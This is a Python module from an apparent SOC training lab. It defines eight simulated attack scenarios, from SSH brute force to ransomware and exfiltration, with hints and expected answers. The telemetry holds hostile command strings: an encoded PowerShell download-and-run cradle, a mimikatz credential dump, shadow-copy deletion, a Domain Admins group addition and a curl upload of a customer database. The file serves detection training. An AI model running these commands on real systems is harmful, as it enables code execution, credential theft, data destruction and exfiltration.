"""
SOC Lab — Attack Scenario Definitions (Phase 9)
=================================================
Provides modular attack scenario definitions for SOC simulation and analyst training.

Every generated telemetry event strictly enforces:
  source_mode = "simulation"
  simulation = True

No physical endpoint connectivity is claimed or required.
"""

from typing import Dict, List, Any
from datetime import datetime, timedelta
import uuid


class ScenarioDefinition:
    """
    Data model representing a structured SOC simulation scenario.
    """

    def __init__(
        self,
        scenario_id: str,
        name: str,
        category: str,
        difficulty: str,
        target_role: str,
        description: str,
        mitre_attack: List[str],
        steps: List[Dict[str, Any]],
        hints: List[str],
        estimated_duration_mins: int = 15,
        expected_answers: Dict[str, Any] = None
    ):
        self.scenario_id = scenario_id
        self.name = name
        self.category = category
        self.difficulty = difficulty
        self.target_role = target_role
        self.description = description
        self.mitre_attack = mitre_attack
        self.steps = steps
        self.hints = hints
        self.estimated_duration_mins = estimated_duration_mins
        self.expected_answers = expected_answers or {}

    def to_dict(self) -> Dict[str, Any]:
        return {
            "scenario_id": self.scenario_id,
            "name": self.name,
            "category": self.category,
            "difficulty": self.difficulty,
            "target_role": self.target_role,
            "description": self.description,
            "mitre_attack": self.mitre_attack,
            "steps": self.steps,
            "hints": self.hints,
            "estimated_duration_mins": self.estimated_duration_mins,
            "expected_answers": self.expected_answers
        }

    def generate_events(self, base_time: datetime = None) -> List[Dict[str, Any]]:
        """
        Generate chronological normalized telemetry events with source_mode = "simulation".
        """
        base_time = base_time or datetime.now()
        events = []

        for step in self.steps:
            offset_seconds = step.get("delay_seconds", 0)
            event_time = (base_time + timedelta(seconds=offset_seconds)).isoformat()
            raw_data = step.get("raw_data", {})

            # Mandatory schema enforcement
            ev_id = f"sim-ev-{uuid.uuid4().hex[:10]}"
            event_obj = {
                "event_id": ev_id,
                "timestamp": event_time,
                "source": step.get("source", "simulated_sensor"),
                "source_type": step.get("source_type", "linux"),
                "source_mode": "simulation",
                "simulation": True,
                "environment": "lab",
                "hostname": step.get("host", "lab-workstation-01"),
                "user": step.get("user", "root"),
                "username": step.get("user", "root"),
                "source_ip": step.get("source_ip", "198.51.100.44"),
                "destination_ip": step.get("destination_ip", "10.0.0.15"),
                "process_name": step.get("process", "/usr/sbin/sshd"),
                "process": step.get("process", "/usr/sbin/sshd"),
                "command": step.get("command", ""),
                "event_category": step.get("event_category", "authentication"),
                "event_type": step.get("event_type", "SSH_LOGIN_FAILED"),
                "severity": step.get("severity", "low"),
                "raw_event": raw_data,
                "details": step.get("details", "")
            }
            events.append(event_obj)

        return events


# ==============================================================================
# STANDARD 8 ATTACK SCENARIO CATALOG
# ==============================================================================

SCENARIOS_CATALOG: Dict[str, ScenarioDefinition] = {

    # 1. SSH Brute Force
    "SCEN-001": ScenarioDefinition(
        scenario_id="SCEN-001",
        name="Linux SSH Brute Force & Login",
        category="CREDENTIAL_ACCESS",
        difficulty="EASY",
        target_role="SOC Analyst L1",
        description="External IP attempts multiple failed SSH authentication requests against internal Linux server followed by successful root login.",
        mitre_attack=["T1110.001", "T1078"],
        hints=[
            "Filter telemetry by event_type 'SSH_LOGIN_FAILED' and group by source_ip.",
            "Check for a subsequent 'SSH_LOGIN_SUCCESS' from the same attacker IP.",
            "Verify if an alert or correlation incident was triggered for brute force."
        ],
        estimated_duration_mins=10,
        expected_answers={
            "triage_verdict": "TRUE_POSITIVE",
            "attacker_ip": "198.51.100.44",
            "target_host": "linux-srv-01",
            "compromised_user": "root",
            "mitre_technique": "T1110.001",
            "recommended_soar": "ADD_IOC_SIMULATED_BLOCKLIST"
        },
        steps=[
            {
                "delay_seconds": 0,
                "source_type": "linux",
                "host": "linux-srv-01",
                "user": "root",
                "source_ip": "198.51.100.44",
                "destination_ip": "10.0.0.15",
                "process": "/usr/sbin/sshd",
                "event_category": "authentication",
                "event_type": "SSH_LOGIN_FAILED",
                "severity": "low",
                "details": "Failed password for root from 198.51.100.44 port 48201 ssh2",
                "raw_data": {"sshd_result": "FAIL", "attempt": 1}
            },
            {
                "delay_seconds": 2,
                "source_type": "linux",
                "host": "linux-srv-01",
                "user": "root",
                "source_ip": "198.51.100.44",
                "destination_ip": "10.0.0.15",
                "process": "/usr/sbin/sshd",
                "event_category": "authentication",
                "event_type": "SSH_LOGIN_FAILED",
                "severity": "low",
                "details": "Failed password for root from 198.51.100.44 port 48202 ssh2",
                "raw_data": {"sshd_result": "FAIL", "attempt": 2}
            },
            {
                "delay_seconds": 4,
                "source_type": "linux",
                "host": "linux-srv-01",
                "user": "root",
                "source_ip": "198.51.100.44",
                "destination_ip": "10.0.0.15",
                "process": "/usr/sbin/sshd",
                "event_category": "authentication",
                "event_type": "SSH_LOGIN_FAILED",
                "severity": "medium",
                "details": "Failed password for root from 198.51.100.44 port 48203 ssh2",
                "raw_data": {"sshd_result": "FAIL", "attempt": 3}
            },
            {
                "delay_seconds": 6,
                "source_type": "linux",
                "host": "linux-srv-01",
                "user": "root",
                "source_ip": "198.51.100.44",
                "destination_ip": "10.0.0.15",
                "process": "/usr/sbin/sshd",
                "event_category": "authentication",
                "event_type": "SSH_LOGIN_SUCCESS",
                "severity": "high",
                "details": "Accepted password for root from 198.51.100.44 port 48205 ssh2",
                "raw_data": {"sshd_result": "SUCCESS", "auth_method": "password"}
            }
        ]
    ),

    # 2. Windows Brute Force
    "SCEN-002": ScenarioDefinition(
        scenario_id="SCEN-002",
        name="Windows Active Directory Brute Force",
        category="CREDENTIAL_ACCESS",
        difficulty="EASY",
        target_role="SOC Analyst L1",
        description="Repeated Windows Event ID 4625 failed logins on Domain Controller followed by Event 4624 successful logon.",
        mitre_attack=["T1110", "T1078.002"],
        hints=[
            "Search for Windows Event ID 4625 across domain workstations.",
            "Identify the target account being brute forced.",
            "Verify if password spray correlation rule fired."
        ],
        estimated_duration_mins=10,
        expected_answers={
            "triage_verdict": "TRUE_POSITIVE",
            "target_host": "DC-01.corp.internal",
            "compromised_user": "jdoe",
            "mitre_technique": "T1110",
            "recommended_soar": "DISABLE_ACCOUNT"
        },
        steps=[
            {
                "delay_seconds": 0,
                "source_type": "windows",
                "host": "DC-01.corp.internal",
                "user": "jdoe",
                "source_ip": "192.168.1.105",
                "destination_ip": "10.0.0.5",
                "process": "C:\\Windows\\System32\\lsass.exe",
                "event_category": "authentication",
                "event_type": "4625",
                "severity": "low",
                "details": "An account failed to log on. Logon Type: 3. Status: 0xC000006D.",
                "raw_data": {"event_id": 4625, "target_user_name": "jdoe"}
            },
            {
                "delay_seconds": 2,
                "source_type": "windows",
                "host": "DC-01.corp.internal",
                "user": "jdoe",
                "source_ip": "192.168.1.105",
                "destination_ip": "10.0.0.5",
                "process": "C:\\Windows\\System32\\lsass.exe",
                "event_category": "authentication",
                "event_type": "4625",
                "severity": "low",
                "details": "An account failed to log on. Logon Type: 3. Status: 0xC000006D.",
                "raw_data": {"event_id": 4625, "target_user_name": "jdoe"}
            },
            {
                "delay_seconds": 5,
                "source_type": "windows",
                "host": "DC-01.corp.internal",
                "user": "jdoe",
                "source_ip": "192.168.1.105",
                "destination_ip": "10.0.0.5",
                "process": "C:\\Windows\\System32\\lsass.exe",
                "event_category": "authentication",
                "event_type": "4624",
                "severity": "medium",
                "details": "An account was successfully logged on. Logon Type: 3.",
                "raw_data": {"event_id": 4624, "target_user_name": "jdoe"}
            }
        ]
    ),

    # 3. Suspicious PowerShell Execution
    "SCEN-003": ScenarioDefinition(
        scenario_id="SCEN-003",
        name="Obfuscated PowerShell Script Execution",
        category="EXECUTION",
        difficulty="MEDIUM",
        target_role="SOC Analyst L1",
        description="User workstation executes Base64 encoded PowerShell script initiating outbound web request to untrusted external IP.",
        mitre_attack=["T1059.001", "T1027"],
        hints=[
            "Look for powershell.exe command lines containing '-enc' or '-EncodedCommand'.",
            "Decode the Base64 payload to identify the C2 URL or command.",
            "Check endpoint process parent-child relationship."
        ],
        estimated_duration_mins=15,
        expected_answers={
            "triage_verdict": "TRUE_POSITIVE",
            "process": "powershell.exe",
            "command_flag": "-EncodedCommand",
            "mitre_technique": "T1059.001",
            "recommended_soar": "ISOLATE_HOST"
        },
        steps=[
            {
                "delay_seconds": 0,
                "source_type": "windows",
                "host": "WS-FINANCE-02",
                "user": "bsmith",
                "source_ip": "192.168.1.42",
                "destination_ip": "203.0.113.88",
                "process": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "command": "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADIAMAAzAC4AMAAuADEAMQAzAC4AOAA4AC8AcwB0AGEAZwBlADEALgBwAHMAMQAnACkA",
                "event_category": "process_execution",
                "event_type": "4688",
                "severity": "high",
                "details": "A new process has been created: powershell.exe with encoded payload string.",
                "raw_data": {"event_id": 4688, "process_name": "powershell.exe"}
            }
        ]
    ),

    # 4. Account Compromise
    "SCEN-004": ScenarioDefinition(
        scenario_id="SCEN-004",
        name="Account Compromise & Privilege Escalation",
        category="PRIVILEGE_ESCALATION",
        difficulty="MEDIUM",
        target_role="SOC Analyst L2",
        description="Normal user account logs in outside normal business hours, runs mimikatz credential dumping, and adds self to Domain Admins.",
        mitre_attack=["T1003.001", "T1098"],
        hints=[
            "Examine sensitive Windows Event ID 4728 (member added to security-enabled group).",
            "Inspect process creation events for mimikatz or sekurlsa.",
            "Verify user role changes in audit logs."
        ],
        estimated_duration_mins=20,
        expected_answers={
            "triage_verdict": "TRUE_POSITIVE",
            "compromised_user": "dev_user",
            "escalated_group": "Domain Admins",
            "mitre_technique": "T1003.001",
            "recommended_soar": "DISABLE_ACCOUNT"
        },
        steps=[
            {
                "delay_seconds": 0,
                "source_type": "windows",
                "host": "WS-DEV-09",
                "user": "dev_user",
                "source_ip": "192.168.1.120",
                "destination_ip": "10.0.0.5",
                "process": "C:\\Users\\Public\\mimikatz.exe",
                "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
                "event_category": "process_execution",
                "event_type": "4688",
                "severity": "critical",
                "details": "Mimikatz credential access tool detected executing on workstation.",
                "raw_data": {"event_id": 4688, "tool": "mimikatz"}
            },
            {
                "delay_seconds": 5,
                "source_type": "windows",
                "host": "DC-01.corp.internal",
                "user": "dev_user",
                "source_ip": "192.168.1.120",
                "destination_ip": "10.0.0.5",
                "process": "C:\\Windows\\System32\\net.exe",
                "command": "net group \"Domain Admins\" dev_user /ADD",
                "event_category": "group_management",
                "event_type": "4728",
                "severity": "critical",
                "details": "Member added to security-enabled global group 'Domain Admins'.",
                "raw_data": {"event_id": 4728, "group_name": "Domain Admins", "member": "dev_user"}
            }
        ]
    ),

    # 5. Suspicious DNS Activity
    "SCEN-005": ScenarioDefinition(
        scenario_id="SCEN-005",
        name="DNS Tunneling & DGA Query Spikes",
        category="COMMAND_AND_CONTROL",
        difficulty="MEDIUM",
        target_role="SOC Analyst L2",
        description="High volume of long, high-entropy subdomain DNS queries to a freshly registered top-level domain.",
        mitre_attack=["T1071.004", "T1568.002"],
        hints=[
            "Filter Zeek or DNS logs by long subdomain strings.",
            "Check for repetitive TXT query record requests.",
            "Perform threat intel lookup on the root domain name."
        ],
        estimated_duration_mins=15,
        expected_answers={
            "triage_verdict": "TRUE_POSITIVE",
            "suspicious_domain": "exfil-tunnel-c2.top",
            "protocol": "DNS TXT",
            "mitre_technique": "T1071.004",
            "recommended_soar": "ADD_IOC_SIMULATED_BLOCKLIST"
        },
        steps=[
            {
                "delay_seconds": 0,
                "source_type": "zeek",
                "host": "GW-DNS-01",
                "user": "system",
                "source_ip": "192.168.1.88",
                "destination_ip": "8.8.8.8",
                "process": "named",
                "event_category": "network",
                "event_type": "DNS_QUERY",
                "severity": "high",
                "details": "DNS Query: high-entropy TXT lookup for a08f3b92c.exfil-tunnel-c2.top",
                "raw_data": {"query": "a08f3b92c.exfil-tunnel-c2.top", "qtype": "TXT"}
            }
        ]
    ),

    # 6. Malicious IOC Detection
    "SCEN-006": ScenarioDefinition(
        scenario_id="SCEN-006",
        name="High-Confidence Malicious IOC Match",
        category="DEFENSE_EVASION",
        difficulty="EASY",
        target_role="SOC Analyst L1",
        description="Internal host connects directly to known Cobalt Strike command and control IP address listed in Threat Intel feeds.",
        mitre_attack=["T1071.001", "T1589"],
        hints=[
            "Check Threat Intel feed for IOC match on IP 198.51.100.99.",
            "Verify reputation score and VirusTotal/AbuseIPDB classification.",
            "Block IP using SOAR playbook."
        ],
        estimated_duration_mins=10,
        expected_answers={
            "triage_verdict": "TRUE_POSITIVE",
            "malicious_ioc": "198.51.100.99",
            "reputation": "MALICIOUS",
            "mitre_technique": "T1071.001",
            "recommended_soar": "ADD_IOC_SIMULATED_BLOCKLIST"
        },
        steps=[
            {
                "delay_seconds": 0,
                "source_type": "suricata",
                "host": "FW-PERIMETER-01",
                "user": "system",
                "source_ip": "10.0.0.50",
                "destination_ip": "198.51.100.99",
                "process": "kernel",
                "event_category": "network",
                "event_type": "SURICATA_ALERT",
                "severity": "high",
                "details": "ET MALWARE Cobalt Strike C2 Traffic Detected Outbound",
                "raw_data": {"signature": "Cobalt Strike C2 Beacon", "ioc_match": "198.51.100.99"}
            }
        ]
    ),

    # 7. Multi-Stage Attack
    "SCEN-007": ScenarioDefinition(
        scenario_id="SCEN-007",
        name="Multi-Stage Ransomware Killchain",
        category="ATTACK_SIMULATION",
        difficulty="HARD",
        target_role="Incident Responder",
        description="Full kill chain: Phishing email -> Encoded PowerShell -> LSASS credential dump -> Lateral Movement -> Mass File Encryption.",
        mitre_attack=["T1566", "T1059.001", "T1003.001", "T1021.002", "T1486"],
        hints=[
            "Track the timeline progression across workstation WS-CORP-10 and server DB-PROD-01.",
            "Identify the initial access vector (phishing attachment).",
            "Escalate to a Critical Incident and execute host isolation."
        ],
        estimated_duration_mins=25,
        expected_answers={
            "triage_verdict": "TRUE_POSITIVE",
            "initial_access": "Phishing Attachment",
            "ransomware_extension": ".locked",
            "mitre_technique": "T1486",
            "recommended_soar": "ISOLATE_HOST"
        },
        steps=[
            {
                "delay_seconds": 0,
                "source_type": "windows",
                "host": "WS-CORP-10",
                "user": "akhan",
                "source_ip": "192.168.1.150",
                "destination_ip": "198.51.100.22",
                "process": "C:\\Program Files\\Microsoft Office\\Office16\\OUTLOOK.EXE",
                "command": "outlook.exe /attachment Invoice_9921.docm",
                "event_category": "email",
                "event_type": "PHISHING_MALICIOUS_ATTACHMENT",
                "severity": "medium",
                "details": "User opened suspicious macro-enabled document Invoice_9921.docm",
                "raw_data": {"file": "Invoice_9921.docm"}
            },
            {
                "delay_seconds": 3,
                "source_type": "windows",
                "host": "WS-CORP-10",
                "user": "akhan",
                "source_ip": "192.168.1.150",
                "destination_ip": "198.51.100.22",
                "process": "powershell.exe",
                "command": "powershell.exe -enc IEV4ZWM...",
                "event_category": "execution",
                "event_type": "4688",
                "severity": "high",
                "details": "PowerShell spawned from WINWORD.EXE",
                "raw_data": {"parent": "WINWORD.EXE"}
            },
            {
                "delay_seconds": 6,
                "source_type": "windows",
                "host": "DB-PROD-01",
                "user": "SYSTEM",
                "source_ip": "192.168.1.150",
                "destination_ip": "10.0.0.88",
                "process": "C:\\Windows\\Temp\\vssadmin.exe",
                "command": "vssadmin.exe delete shadows /all /quiet",
                "event_category": "impact",
                "event_type": "RANSOMWARE_PREPARATION",
                "severity": "critical",
                "details": "Shadow copies deleted on production database server.",
                "raw_data": {"action": "delete_shadows"}
            }
        ]
    ),

    # 8. Data Exfiltration Simulation
    "SCEN-008": ScenarioDefinition(
        scenario_id="SCEN-008",
        name="Large Volume Data Exfiltration Over HTTPS",
        category="EXFILTRATION",
        difficulty="MEDIUM",
        target_role="SOC Analyst L2",
        description="Internal database service account compresses sensitive customer database and uploads 5GB archive to cloud storage provider.",
        mitre_attack=["T1560.001", "T1048.003"],
        hints=[
            "Examine network byte counts for high outbound transfer volume.",
            "Check for 7-zip or archive process creation targeting database folders.",
            "Identify the destination IP and cloud endpoint."
        ],
        estimated_duration_mins=15,
        expected_answers={
            "triage_verdict": "TRUE_POSITIVE",
            "exfiltrated_data_mb": 5120,
            "archive_tool": "7z.exe",
            "mitre_technique": "T1048.003",
            "recommended_soar": "ISOLATE_HOST"
        },
        steps=[
            {
                "delay_seconds": 0,
                "source_type": "windows",
                "host": "DB-CUST-01",
                "user": "sql_service",
                "source_ip": "10.0.0.90",
                "destination_ip": "203.0.113.200",
                "process": "C:\\Program Files\\7-Zip\\7z.exe",
                "command": "7z.exe a -pSecret123 C:\\Windows\\Temp\\cust_db_export.7z D:\\SQLData\\CustomerDB.mdf",
                "event_category": "archive",
                "event_type": "DATA_COMPRESSION",
                "severity": "medium",
                "details": "Volumetric database compression created in Temp directory.",
                "raw_data": {"tool": "7z.exe", "file": "cust_db_export.7z"}
            },
            {
                "delay_seconds": 4,
                "source_type": "suricata",
                "host": "FW-PERIMETER-01",
                "user": "sql_service",
                "source_ip": "10.0.0.90",
                "destination_ip": "203.0.113.200",
                "process": "curl.exe",
                "command": "curl.exe -F file=@cust_db_export.7z https://upload.mega.nz/api/v2",
                "event_category": "exfiltration",
                "event_type": "HIGH_VOLUME_OUTBOUND_TRANSFER",
                "severity": "critical",
                "details": "Network anomaly: 5.12 GB outbound transfer to mega.nz cloud storage.",
                "raw_data": {"bytes_sent": 5368709120, "destination": "upload.mega.nz"}
            }
        ]
    )
}


def get_scenario(scenario_id: str) -> ScenarioDefinition:
    """Retrieve scenario definition by ID."""
    return SCENARIOS_CATALOG.get(scenario_id)


def list_scenarios() -> List[Dict[str, Any]]:
    """List all available scenario definitions."""
    return [scen.to_dict() for scen in SCENARIOS_CATALOG.values()]
